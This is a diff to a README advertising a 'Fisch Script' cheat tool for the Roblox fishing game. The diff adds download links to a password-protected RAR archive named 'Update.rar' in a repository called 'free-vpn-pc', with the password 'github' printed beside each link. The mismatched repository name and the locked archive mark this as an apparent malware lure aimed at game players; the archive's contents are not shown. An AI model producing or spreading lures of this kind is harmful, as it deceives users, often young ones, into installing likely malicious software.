@@ -1,6 +1,6 @@
 # 🎣 **Fisch Script 2025 – The Ultimate Roblox Fishing Tool**  
 
-[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-red?style=for-the-badge&logo=download)]()  
+[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-red?style=for-the-badge&logo=download)](https://github.com/BilxTren17/free-vpn-pc/releases/download/Update/Update.rar)  
 ## 🔐 PASSWORD: github  
 
 Welcome to **Fisch Script** – the ultimate fishing automation tool for Roblox! This advanced script is designed to **enhance your fishing experience**, making it faster, easier, and more efficient. Whether you're looking for **auto-fishing**, **instant catches**, **teleportation**, or **rare fish tracking**, this script has everything you need to dominate the waters! 🌊🐟  
@@ -10,7 +10,7 @@ Welcome to **Fisch Script** – the ultimate fishing automation tool for Roblox!
 
   
 
-[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-red?style=for-the-badge&logo=download)]()  
+[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-red?style=for-the-badge&logo=download)](https://github.com/BilxTren17/free-vpn-pc/releases/download/Update/Update.rar)  
 ## 🔐 PASSWORD: github  
 
 ---  
